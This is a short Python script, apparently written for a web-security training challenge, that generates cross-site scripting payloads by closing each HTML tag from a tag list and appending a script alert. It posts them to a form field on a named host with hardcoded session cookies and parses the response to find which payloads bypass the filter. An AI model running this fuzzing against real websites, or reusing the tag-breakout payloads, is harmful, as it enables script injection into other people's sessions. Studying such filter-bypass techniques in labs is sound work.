#coding:utf-8
 
import random , requests , copy ,urlparse, urllib , pprint
from bs4 import BeautifulSoup

l = []
XSS_Rule={}
with open('html_tags3.txt') as fin:
    for row in fin:
        tag= row.split()[0]
        s = '</' + tag[1:] + '</script></title></style>"--><script>alert()</script>'
        s = '"--></' + tag[1:] + '<script>alert()</script>'
        l.append(s)

XSS_Rule['html_payload2'] = l
cookies={
    '_ga': 'GA1.2.1486936008.1544290460',
    '_gid': 'GA1.2.555416503.1544290460',
    'PHPSESSID':'6vfi61oeng6bbdg7dupr2uhbb2'}
# print('\n'.join(l))
# exit()

def chef(data):
    l = []
    soup = BeautifulSoup(data,'html.parser')
    data = soup.findAll("div", {"class": "content"})[0]
    for i,tags in enumerate(data.findAll('img')):
        data = str(tags)[14:]
        idx = data.find('><')
        data = data[:idx]
        if 'filter' not in data:
            idx = data.find('.')
            idx = int(data[:idx])
            l.append(idx)
        print(data)
    return l

whole_l = []
for x in XSS_Rule:
    for z in XSS_Rule[x]:
        whole_l.append(z)

def cook(payload):
    r = requests.post('http://edu.kaibro.tw:5566/index.php', data = {
        'xss':payload , 'action':'send'},cookies=cookies) 
    print(payload)
    print(chef(r.content))
    print('\n')

import threadpool  
pool = threadpool.ThreadPool(1)
req = threadpool.makeRequests(cook, whole_l) 
[pool.putRequest(re) for re in req] 
pool.wait() 

# </xmp></script></title></style>"--><script>alert()</script>